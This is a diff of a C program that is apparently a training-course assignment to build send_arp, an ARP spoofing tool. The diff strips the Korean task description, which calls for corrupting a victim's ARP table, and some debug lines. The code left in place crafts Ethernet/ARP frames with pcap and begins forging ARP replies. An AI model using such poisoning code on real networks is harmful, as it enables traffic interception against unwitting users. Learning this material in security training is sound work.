@@ -1,31 +1,3 @@
-/*
-
-[리포트]
-sender(victim)의 arp table을 변조하라.
-
-[프로그램]
-send_arp <interface> <sender ip> <target ip>
-ex : send_arp wlan0 192.168.10.2 192.168.10.1
-
-sender ip는 victim ip라고도 함.
-target ip는 일반적으로 gateway임.
-
-[학습]
-구글링을 통해서 arp header의 구조(각 필드의 의미)를 익힌다.
-
-pcap_sendpacket 함수를 이용해서 user defined buffer를 packet으로 전송하는 방법을 익힌다.
-
-attacker(자신) mac 정보를 알아 내는 방법은 구글링을 통해서 코드를 베껴 와도 된다.
-
-arp infection packet 구성에 필요한 sender mac 정보는 프로그램 레벨에서 자동으로(정상적인 arp request를 날리고 그 arp reply를 받아서) 알아 오도록 코딩한다.
-
-최종적으로 상대방을 감염시킬 수 있도록 eth header와 arp header를 구성하여 arp infection packet을 보내고 sender에서 target arp table이 변조되는 것을 확인해 본다.
-
-[리포트 제목]
-char track[] = "개발"; // "취약점", "컨설팅", "포렌식"
-char name[] = "홍길동";
-printf("[bob7][%s]send_arp[%s]", track, name);
-*/
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -42,14 +14,9 @@ enum { ARGV_CMD, ARGV_INTERFACE };
 #define ether_ARP 0x0806 
 int main(int argc,const char* argv[]){ 
 
-	char track[] = "포렌식"; // "취약점", "컨설팅", "포렌식"
-	char name[] = "김영웅";
-	printf("[bob7][%s]send_arp[%s]", track, name);
-
 
     int sock;
     struct ifreq ifr;
-    //char *mac = NULL;
  
     if (argc < 2){
         fprintf(stderr,"usage: arp_test <interface> <victim_ip> <target_ip>   \n");
@@ -75,8 +42,6 @@ int main(int argc,const char* argv[]){
         return 1;
     }
     
-//    mac = ifr.ifr_hwaddr.sa_data;
- //   printf("%s: %02x:%02x:%02x:%02x:%02x:%02x\n", ifr.ifr_name, mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
     close(sock);
 
 ////I copied the above Codes.
@@ -86,9 +51,7 @@ int main(int argc,const char* argv[]){
     const unsigned char* source_mac_addr=(unsigned char*)ifr.ifr_hwaddr.sa_data;
     memcpy(eth_header.ether_shost,source_mac_addr,sizeof(eth_header.ether_shost));
 
-//    memcpy(eth_header.ether_shost, mac, sizeof(eth_header.ether_shost));
     eth_header.ether_type = ntohs(ether_ARP);
-//    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", eth_header.ether_shost[0], eth_header.ether_shost[1], eth_header.ether_shost[2], eth_header.ether_shost[3], eth_header.ether_shost[4], eth_header.ether_shost[5]);
 
     
     size_t if_name_len=strlen(if_name);
@@ -131,7 +94,6 @@ int main(int argc,const char* argv[]){
     memcpy(&req_header.arp_spa,&source_ip_addr->sin_addr.s_addr,sizeof(req_header.arp_spa));
     memset(req_header.arp_tha, 0x00, sizeof(req_header.arp_tha));
     memcpy(&req_header.arp_tpa,&victim_ip_addr.s_addr,sizeof(req_header.arp_tpa));
-    //printf("%d.%d.%d.%d",req_header.arp_tpa[0],req_header.arp_tpa[1],req_header.arp_tpa[2],req_header.arp_tpa[3]);
 
     unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
     memcpy(frame,&eth_header,sizeof(struct ether_header));
@@ -152,28 +114,7 @@ int main(int argc,const char* argv[]){
         pcap_close(handle);
         exit(1);
     }
-  /*  
-    struct pcap_pkthdr* header;         // The header that pcap gives us
-    const u_char* packet;               // The actual packet
-    int res = pcap_next_ex(handle, &header, &packet);
-    
-    struct ether_header* rec_eth;
-    rec_eth = (struct ether_header*)(packet);
 
-    struct ether_arp* rec_arp;
-    rec_arp = (struct ether_arp*)(packet+sizeof(ether_header));
-    */
-    //printf("%02x:%02x:%02x:%02x:%02x:%02x",rec_eth->ether_shost[0],rec_eth->ether_shost[1],rec_eth->ether_shost[2],rec_eth->ether_shost[3],rec_eth->ether_shost[4],rec_eth->ether_shost[5]);
-    //printf("%d.%d.%d.%d\n",rec_arp->arp_spa[0],rec_arp->arp_spa[1],rec_arp->arp_spa[2],rec_arp->arp_spa[3]);
-
-//Spoofing
-    //char * temp;
-    //memcpy()
-    //printf("%04x\n", rec_arp->arp_spa);
-    //printf("%s\n", victim_ip_string);
-
-
-    //while(memcmp(rec_arp->arp_spa, &victim_ip_addr.s_addr, sizeof(rec_arp->arp_spa))!=0){
     while(1){
 
     	struct pcap_pkthdr* header;         // The header that pcap gives us
@@ -200,10 +141,8 @@ int main(int argc,const char* argv[]){
     	}
 	
 	}
-	//printf("receiving packet is Done!\n");
+
     req_header.arp_op = htons(0x0002);
-	//memcpy(eth_header.ether_dhost, rec_arp->arp_sha, sizeof(eth_header.ether_dhost));
-	//memcpy(req_header.arp_tha, rec_arp->arp_sha, sizeof(req_header.arp_tha));
 
 	struct in_addr target_ip_addr={0};
 	if (!inet_aton(target_ip_string,&target_ip_addr)) {
